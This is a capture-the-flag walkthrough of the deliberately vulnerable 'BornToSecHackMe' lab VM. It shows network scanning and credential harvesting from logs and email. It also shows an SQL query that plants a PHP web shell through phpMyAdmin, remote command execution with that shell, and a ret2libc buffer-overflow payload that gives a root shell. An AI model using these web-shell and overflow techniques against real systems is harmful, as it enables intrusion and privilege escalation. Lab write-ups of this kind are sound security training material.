### 1. Let's find the VM's IP address

First, we need to find the IP address of the VM. We can do this by running `ifconfig` in the VM's terminal. (beforehand, we need to setup the project vm network to private host network 'virtualbox0 in virtualbox)

vboxnet0  Link encap:Ethernet  HWaddr 0A:00:27:00:00:00
          inet addr:192.168.56.1  Bcast:192.168.56.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:260 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0  TX bytes:45144

The IP address of virtualbox is '192.168.56.1' so the network address is '192.168.56.0/24'.

now we can use nmap to scan the network for the VM's IP address.
nmap nmap 192.168.56.0/24 

Nmap scan report for 192.168.56.109
Host is up (0.00034s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

the server is running on 192.168.56.109

### 2. Let's scan the server for open ports

We're going to make a script (in python) with the most common path used

here is the output:
Found: https://192.168.56.109/forum
Found: https://192.168.56.109/phpmyadmin
Found: https://192.168.56.109/webmail

### 3. anaylze the websites

In the forum section we found an interesting topic from lmezard called "Probleme login ?"

``` shell
Probleme login ?
by lmezard, Thursday, October 08, 2015, 00:10 (1588 days ago)
edited by admin, Thursday, October 08, 2015, 00:17

Oct 5 08:44:40 BornToSecHackMe sshd[7482]: input_userauth_request: invalid user test [preauth]
Oct 5 08:44:40 BornToSecHackMe sshd[7482]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:44:40 BornToSecHackMe sshd[7482]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:44:42 BornToSecHackMe sshd[7482]: Failed password for invalid user test from 161.202.39.38 port 53781 ssh2
[...]
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from
161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
[...]
Oct 5 17:24:01 BornToSecHackMe CRON[550]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 17:51:01 BornToSecHackMe CRON[1739]: pam_unix(cron:session): session closed for user root
Oct 5 17:51:15 BornToSecHackMe sshd[1782]: Accepted password for admin from 62.210.32.157 port 56754 ssh2
Oct 5 17:51:15 BornToSecHackMe sshd[1782]: pam_unix(sshd:session): session opened for user admin by (uid=0)
```

this line seems intresting:

```shell
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from
```
let's try to login using lmezard as username and !q\]Ej?*5K5cy*AJ as password (it worked what a surprise)
Once connected we can see the user list 

admin	Admin	 	E-mail
lmezard	User	 	 
qudevide	User	 	 
thor	User	 	 
wandre	User	 	 
zaz	User

after a few investigations we found nothing particular the account has no special rights.
BUT we found his email "laurie@borntosec.net" and we can use it to connect to the webmail.

we are going to connect to the webmail using the email and the password we found earlier.

we found an email from the admin? to lmezard:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

## PhpMyAdmin

we can now connect to phpmyadmin using the credentials we found earlier.
the forum is coded in php from the sql console command we can try to inject some code.

let's create a simpe file:
```SQL
SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/test.php"
```
it can now be accessed from the browser using the url: https://192.168.56.109/forum/templates_c/test.php

With the injected page we can now execute commands on the server. For example:
```
https://192.168.56.109/forum/templates_c/test.php?cmd=pwd
```
that gives us /var/www/forum/templates_c

at this point it's like using a shell on the server. we can now navigate through the directories and find the interesting stuff.

https://192.168.56.109/forum/templates_c/test.php?cmd=ls%20/home

LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz


https://192.168.56.109/forum/templates_c/test.php?cmd=ls%20/home/LOOKATME
https://192.168.56.109/forum/templates_c/test.php?cmd=cat%20/home/LOOKATME/password

here is another login and password: lmezard:G!@M6f4Eatau{sF"

we're going to try this login on the ssh and ftp server to check which one we can access to.


## FTP

ftp lmezard@192.168.56.109

```shell
➜  ~ ftp lmezard@192.168.56.109
Connected to 192.168.56.109.
220 Welcome on this server
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
226 Transfer complete.
96 bytes received in 0,000396 seconds (237 kbytes/s)
ftp> get fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
226 Transfer complete.
808960 bytes received in 0,0256 seconds (30,1 Mbytes/s)
```

readme contains "Complete this little challenge and use the result as password for user 'laurie' to login in ssh"

after using ```file fun``` we know that fun is a tar file

```shell
mv fun fun.tar
tar -xvf fun.tar
```

even though we could've read the file using vscode let's do it using grep getme *

previously while reading the raw tar i found the main function that looks like this
```C
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
```
Each file redirects to another file that contains the return value
so by grepping each file that contain getme we have the current file commented that contains the return value example:

cat 331ZU.pcap

```c
char getme1() {

//file5
```

grep //file6 *
cat APM1E.pcap 
 
```c
return 'I';

//file6%  
```

after trying to reconsituate the puzzle we get:

```c
char getme1() { return 'I'; }
char getme2() { return 'h'; }
char getme3() { return 'e'; }
char getme4() { return 'a'; }
char getme5() { return 'r'; }
char getme6() { return 't'; }
char getme7() { return 'p'; }
char getme8() { return 'w'; }
char getme9() { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
```

the password is: Iheartpwnage we have to hash it using sha256
we get 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4 for the password and laurie as the login


## SSH

now that we have the login and the password we can connect to the ssh server

ssh laurie@192.168.56.109

paste the password : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

there is an executable called "bomb" and a README:

README:
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

Here we have a small game with 6 answers to find, we're just going to find them with ghidra:

```c
 - Phase 1: Public speaking is very easy.
 - Phase 2: 1 2 6 24 120 720
 - Phase 3: 1 b 214
 - Phase 4: 9
 - Phase 5: opekmq
 - Phase 6: 4 2 6 3 1 5
 ```

 all responses make up the password: Publicspeakingisveryeasy.126241207201b2149opekmq426135

 ## Now let's ssh on thor

ssh thor@192.168.56.109

we found two file with the same principle a challenge to find the password for thr zaz user.
Here we're given a file named turtle that contains instruction.

GPT told us that turtle is also a library for python. So we made a script that execute the turtle file and print the result.

THe final result given is the word SLASH
at the end of the file we're suggested to digest the message so we're going to use md5 to with the word SLASH

= 646da671ca01bb5d84dbb5fb2238dc8e

## Now let's ssh on zaz

ssh zaz@192.168.56.109

in this level we got an executable called ./exploit_me and a folder mail
we're just going to use the executable and use gdb to inspect it:

```asm
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax # here is the retur value if a strcpy fails
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
```
The executable takes a string as an argument using pattern we know that it crashed when we send it a string with more than 140 characters.
It seems like we have to do a buffer overflow to get the password?

instead of using a shellcode we're just gonna get the address of the system function and variable bash

```shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system> # address for system
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58 # address for /bin/sh
```

the "script" looks like that:

```
./exploit_me `python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')"`
```

```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')"`
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`��AAAAX���
# whoami
root
# 
```

DONE